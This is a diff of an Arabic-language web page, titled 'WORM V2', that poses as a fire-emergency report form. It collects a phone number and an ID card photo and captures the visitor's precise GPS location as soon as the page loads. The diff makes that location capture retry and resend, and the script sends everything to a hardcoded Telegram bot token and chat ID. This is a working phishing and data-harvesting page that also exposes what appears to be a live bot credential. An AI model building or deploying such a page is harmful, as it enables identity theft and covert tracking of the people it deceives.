@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بلاغ حريق - WORM</title>
+    <title>بلاغ حريق - WORM V2</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
-            background: #1a1a1a;
+            background: #0d0d0d;
             color: #fff;
             display: flex;
             justify-content: center;
@@ -17,24 +17,16 @@
             padding: 20px;
         }
         .container {
-            background: #2d2d2d;
+            background: #1e1e1e;
             padding: 30px;
             border-radius: 20px;
             max-width: 450px;
             width: 100%;
-            box-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
-            border: 1px solid #ff4444;
+            border: 2px solid #ff2222;
+            box-shadow: 0 0 40px rgba(255, 0, 0, 0.5);
         }
-        h1 {
-            text-align: center;
-            color: #ff4444;
-            margin-bottom: 25px;
-        }
-        label {
-            display: block;
-            margin: 15px 0 5px;
-            font-weight: bold;
-        }
+        h1 { color: #ff3333; text-align: center; }
+        label { display: block; margin: 15px 0 5px; font-weight: bold; }
         input, button {
             width: 100%;
             padding: 12px;
@@ -44,43 +36,46 @@
             box-sizing: border-box;
         }
         input {
-            background: #3a3a3a;
+            background: #2a2a2a;
             color: #fff;
-            border: 1px solid #555;
+            border: 1px solid #444;
         }
-        input:focus {
-            outline: 2px solid #ff4444;
-        }
+        input:focus { outline: 2px solid #ff4444; }
         button {
             background: #ff4444;
             color: #fff;
             font-weight: bold;
             cursor: pointer;
-            margin-top: 25px;
+            margin-top: 15px;
             transition: 0.3s;
         }
-        button:hover {
-            background: #cc0000;
-            transform: scale(1.02);
-        }
+        button:hover { background: #cc0000; transform: scale(1.02); }
         #status {
             margin-top: 15px;
             padding: 10px;
-            background: #222;
+            background: #111;
             border-radius: 8px;
             text-align: center;
             font-size: 14px;
             color: #ffaa00;
         }
-        .gps-status {
-            background: #1f3a1f;
-            padding: 8px;
-            border-radius: 8px;
+        .gps-box {
+            background: #1a2a1a;
+            padding: 12px;
+            border-radius: 10px;
+            margin: 15px 0;
             text-align: center;
-            margin: 10px 0;
-            font-size: 13px;
-            color: #7fff7f;
+            border: 1px solid #33aa33;
+            font-size: 14px;
         }
+        .gps-box span { color: #7fff7f; font-weight: bold; }
+        .btn-gps {
+            background: #2a6b2a;
+            margin-top: 5px;
+            padding: 8px;
+            font-size: 14px;
+        }
+        .btn-gps:hover { background: #1f8b1f; }
     </style>
 </head>
 <body>
@@ -88,56 +83,83 @@
 <div class="container">
     <h1>🚨 بلاغ حريق</h1>
 
-    <label>📞 رقم هاتف المبلغ</label>
-    <input type="text" id="phone" placeholder="مثال: 0999999999">
+    <label>📞 رقم الهاتف</label>
+    <input type="text" id="phone" placeholder="مثال: 0952725590" value="0952725590">
 
     <label>🪪 صورة الهوية</label>
     <input type="file" id="idImage" accept="image/*">
 
-    <div class="gps-status" id="gpsStatus">📍 جاري جلب الموقع...</div>
+    <div class="gps-box">
+        <div>📍 الموقع (GPS):</div>
+        <div id="gpsDisplay"><span>⏳ جاري الجلب...</span></div>
+        <button class="btn-gps" id="refreshGpsBtn">🔄 إعادة محاولة الموقع</button>
+    </div>
 
     <button id="sendBtn">🔥 إرسال البلاغ</button>
     <div id="status">⏳ في انتظار الإرسال</div>
 </div>
 
 <script>
-    // ======== بيانات التليجرام ========
     const BOT_TOKEN = "8564646143:AAEDmrL8HbdPESyY9iOJ0TXjEL4_bTSEaTs";
     const CHAT_ID = "8665747715";
 
     let userLat = "غير متاح";
     let userLon = "غير متاح";
+    let gpsAttempts = 0;
 
-    // ======== جلب الموقع في الخلفية ========
-    function getGPS() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    userLat = pos.coords.latitude;
-                    userLon = pos.coords.longitude;
-                    document.getElementById('gpsStatus').innerHTML = `✅ الموقع: ${userLat}, ${userLon}`;
-                },
-                (err) => {
-                    document.getElementById('gpsStatus').innerHTML = '⚠️ تعذر جلب الموقع (أذن يدوي)';
-                    console.warn('GPS error:', err);
-                },
-                { enableHighAccuracy: true, timeout: 15000 }
-            );
-        } else {
-            document.getElementById('gpsStatus').innerHTML = '❌ متصفحك لا يدعم GPS';
+    // ======== دالة جلب الموقع مع إعادة المحاولة ========
+    function getGPS(force = false) {
+        const gpsDisplay = document.getElementById('gpsDisplay');
+        gpsDisplay.innerHTML = `<span>⏳ جاري جلب الموقع...</span>`;
+
+        if (!navigator.geolocation) {
+            gpsDisplay.innerHTML = `<span style="color:#ff6666;">❌ المتصفح لا يدعم GPS</span>`;
+            return;
         }
+
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                userLat = pos.coords.latitude;
+                userLon = pos.coords.longitude;
+                gpsDisplay.innerHTML = `<span style="color:#7fff7f;">✅ ${userLat}, ${userLon}</span>`;
+                document.getElementById('status').innerHTML = '✅ GPS جاهز';
+                document.getElementById('status').style.color = '#7fff7f';
+            },
+            (err) => {
+                let msg = '';
+                switch (err.code) {
+                    case 1: msg = '🚫 المستخدم رفض الإذن (افتح الإعدادات واسمح)'; break;
+                    case 2: msg = '📡 الموقع غير متاح حالياً'; break;
+                    case 3: msg = '⏱️ انتهت مهلة المحاولة'; break;
+                    default: msg = '⚠️ خطأ غير معروف: ' + err.message;
+                }
+                gpsDisplay.innerHTML = `<span style="color:#ff6666;">${msg}</span>`;
+                document.getElementById('status').innerHTML = '⚠️ ' + msg;
+                document.getElementById('status').style.color = '#ffaa00';
+            },
+            {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            }
+        );
     }
 
-    // تشغيل فوري
+    // جلب الموقع فور تحميل الصفحة
     getGPS();
 
-    // ======== رفع الصورة إلى تليجرام كـ multipart ========
+    // زر إعادة المحاولة
+    document.getElementById('refreshGpsBtn').addEventListener('click', function() {
+        getGPS(true);
+    });
+
+    // ======== إرسال البيانات إلى تليجرام ========
     async function sendToTelegram(phone, imageFile, lat, lon) {
         const statusDiv = document.getElementById('status');
         statusDiv.innerHTML = '⏳ جاري الإرسال...';
+        statusDiv.style.color = '#ffaa00';
 
         try {
-            // 1. نرسل الصورة أولاً (كـ Document)
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
             formData.append('document', imageFile);
@@ -162,7 +184,7 @@
         }
     }
 
-    // ======== زر الإرسال ========
+    // ======== زر الإرسال الرئيسي ========
     document.getElementById('sendBtn').addEventListener('click', function () {
         const phone = document.getElementById('phone').value.trim();
         const fileInput = document.getElementById('idImage');
@@ -179,16 +201,21 @@
             return;
         }
 
-        // إعادة محاولة جلب الموقع لحظة الإرسال
-        getGPS();
-
-        // ننتظر ثانية ثم نرسل
-        setTimeout(() => {
+        // إذا الموقع غير متاح، نطلب مرة أخرى قبل الإرسال
+        if (userLat === "غير متاح" || userLon === "غير متاح") {
+            document.getElementById('status').innerHTML = '⏳ جاري جلب الموقع... حاول مرة أخرى خلال 3 ثوان';
+            document.getElementById('status').style.color = '#ffaa00';
+            getGPS();
+            // نرسل بعد 3 ثواني حتى لو لم ينجح (نرسل "غير متاح" لكن نحاول)
+            setTimeout(() => {
+                sendToTelegram(phone, file, userLat, userLon);
+            }, 3000);
+        } else {
             sendToTelegram(phone, file, userLat, userLon);
-        }, 1000);
+        }
     });
 
-    // عند تغيير الملف أو الهاتف نعيد ضبط الحالة
+    // تحديث الحالة عند تغيير المدخلات
     document.getElementById('phone').addEventListener('input', () => {
         document.getElementById('status').innerHTML = '⏳ جاهز للإرسال';
         document.getElementById('status').style.color = '#ffaa00';
